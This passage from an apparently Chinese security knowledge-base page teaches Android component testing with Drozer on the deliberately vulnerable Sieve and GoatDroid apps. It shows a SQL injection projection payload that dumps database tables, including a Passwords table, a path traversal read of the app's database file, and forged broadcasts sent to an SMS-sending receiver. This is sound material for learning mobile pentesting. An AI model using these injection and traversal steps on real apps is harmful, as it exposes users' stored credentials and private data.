<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run scanner.provider.injection -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run scanner.provider.injection </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Scanning com.mwr.example.sieve</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not Vulnerable:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.FileBackupProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.FileBackupProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Injection </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> Projection:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Injection </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> Selection:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></span></code></pre></div></div>
<p><strong>利用注入</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## 列出所有的表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ </span><span class="token parameter variable" style="color:#36acaa">--projection</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;* FROM SQLITE_MASTER WHERE TYPE=&#x27;table&#x27;;--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token builtin class-name">type</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> name             </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> tbl_name         </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> rootpage </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> sql                                                                                              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> table </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> android_metadata </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> android_metadata </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> CREATE TABLE android_metadata </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">locale TEXT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> table </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Passwords        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Passwords        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> CREATE TABLE Passwords </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> table </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Key              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Key              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain">        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> CREATE TABLE Key </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Password TEXT PRIMARY KEY,pin TEXT </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                           </span><span class="token operator" style="color:#393A34">|</span><br></span></code></pre></div></div>
<p><strong>查询是否存在目录遍历</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run scanner.provider.traversal -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run scanner.provider.traversal </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Scanning com.mwr.example.sieve</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not Vulnerable:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Vulnerable Providers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.FileBackupProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.FileBackupProvider</span><br></span></code></pre></div></div>
<p><strong>利用目录遍历读取文件</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.provider.read &lt;uri&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">//data/user/0/com.mwr.example.sieve/databases/database.db</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="broadcastreceiver">BroadcastReceiver<a href="#broadcastreceiver" class="hash-link" aria-label="BroadcastReceiver的直接链接" title="BroadcastReceiver的直接链接">​</a></h4>
<p>风险点：</p>
<ol>
<li>消息伪造</li>
<li>拒绝服务</li>
</ol>
<p>上面的APK不存在广播接收者，所以这里更换为另一个<a href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk" target="_blank" rel="noopener noreferrer">APK</a></p>
<p><strong>获取可导出广播接收者</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.broadcast.info -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.broadcast.info </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> org.owasp.goatdroid.fourgoats</span><br></span></code></pre></div></div>
<p><strong>发送广播</strong></p>
<p>发送电量屏幕的广播</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run app.broadcast.send </span><span class="token parameter variable" style="color:#36acaa">--action</span><span class="token plain"> android.intent.action.SCREEN_ON</span><br></span></code></pre></div></div>
<p>部分系统预定义广播及正常触发时机</p>
<table><thead><tr><th>action</th><th>触发时机</th></tr></thead><tbody><tr><td>android.net.conn.CONNECTIVITY_CHANGE</td><td>网络连接发生变化</td></tr><tr><td>android.intent.action.SCREEN_ON</td><td>屏幕点亮</td></tr><tr><td>android.intent.action.SCREEN_OFF</td><td>屏幕熄灭</td></tr><tr><td>android.intent.action.BATTERY_LOW</td><td>电量低，会弹出电量低提示框</td></tr><tr><td>android.intent.action.BATTERY_OKAY</td><td>电量恢复了</td></tr><tr><td>android.intent.action.BOOT_COMPLETED</td><td>设备启动完毕</td></tr><tr><td>android.intent.action.DEVICE_STORAGE_LOW</td><td>存储空间过低</td></tr><tr><td>android.intent.action.DEVICE_STORAGE_OK</td><td>存储空间恢复</td></tr><tr><td>android.intent.action.PACKAGE_ADDED</td><td>安装了新的应用</td></tr><tr><td>android.net.wifi.STATE_CHANGE</td><td>WiFi 连接状态发生变化</td></tr><tr><td>android.net.wifi.WIFI_STATE_CHANGED</td><td>WiFi 状态变为启用/关闭/正在启动/正在关闭/未知</td></tr><tr><td>android.intent.action.BATTERY_CHANGED</td><td>电池电量发生变化</td></tr><tr><td>android.intent.action.INPUT_METHOD_CHANGED</td><td>系统输入法发生变化</td></tr><tr><td>android.intent.action.ACTION_POWER_CONNECTED</td><td>外部电源连接</td></tr><tr><td>android.intent.action.ACTION_POWER_DISCONNECTED</td><td>外部电源断开连接</td></tr><tr><td>android.intent.action.DREAMING_STARTED</td><td>系统开始休眠</td></tr><tr><td>android.intent.action.DREAMING_STOPPED</td><td>系统停止休眠</td></tr><tr><td>android.intent.action.WALLPAPER_CHANGED</td><td>壁纸发生变化</td></tr><tr><td>android.intent.action.HEADSET_PLUG</td><td>插入耳机</td></tr><tr><td>android.intent.action.MEDIA_UNMOUNTED</td><td>卸载外部介质</td></tr><tr><td>android.intent.action.MEDIA_MOUNTED</td><td>挂载外部介质</td></tr><tr><td>android.os.action.POWER_SAVE_MODE_CHANGED</td><td>省电模式开启</td></tr></tbody></table>
<p>发送给指定的broadcast receiver</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.broadcast.send --component &lt;packagename&gt; &lt;component&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.broadcast.send </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver </span><span class="token parameter variable" style="color:#36acaa">--extra</span><span class="token plain"> string phoneNumber </span><span class="token number" style="color:#36acaa">123</span><span class="token plain">  </span><span class="token parameter variable" style="color:#36acaa">--extra</span><span class="token plain"> string message </span><span class="token number" style="color:#36acaa">666</span><span class="token plain"> </span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20230314125957931" src="/assets/images/image-20230314125957931-11f854ec6f063c1e6a073edf04137735.png" width="1906" height="1110" class="img_ev3q"></p>
<p>extra参数来源：</p>
<p><img decoding="async" loading="lazy" alt="image-20230314130311034" src="/assets/images/image-20230314130311034-3373ad4c5838d93c396af52d37b6ac52.png" width="1540" height="700" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T01:52:29.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/移动安全/adb使用/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">ADB使用</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/category/frida-hook"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">frida-hook</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#drozer" class="table-of-contents__link toc-highlight">Drozer</a><ul><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#安装" class="table-of-contents__link toc-highlight">安装</a><ul><li><a href="#环境准备" class="table-of-contents__link toc-highlight">环境准备</a></li><li><a href="#pc控制端安装" class="table-of-contents__link toc-highlight">PC控制端安装</a></li><li><a href="#设备端agent安装" class="table-of-contents__link toc-highlight">设备端agent安装</a></li></ul></li><li><a href="#连接" class="table-of-contents__link toc-highlight">连接</a></li><li><a href="#相关命令" class="table-of-contents__link toc-highlight">相关命令</a></li></ul></li><li><a href="#四大组件" class="table-of-contents__link toc-highlight">四大组件</a><ul><li><a href="#说明" class="table-of-contents__link toc-highlight">说明</a></li><li><a href="#测试" class="table-of-contents__link toc-highlight">测试</a><ul><li><a href="#activity" class="table-of-contents__link toc-highlight">Activity</a></li><li><a href="#service" class="table-of-contents__link toc-highlight">Service</a></li><li><a href="#contentprovider" class="table-of-contents__link toc-highlight">ContentProvider</a></li><li><a href="#broadcastreceiver" class="table-of-contents__link toc-highlight">BroadcastReceiver</a></li></ul></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">知识库</a></li><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>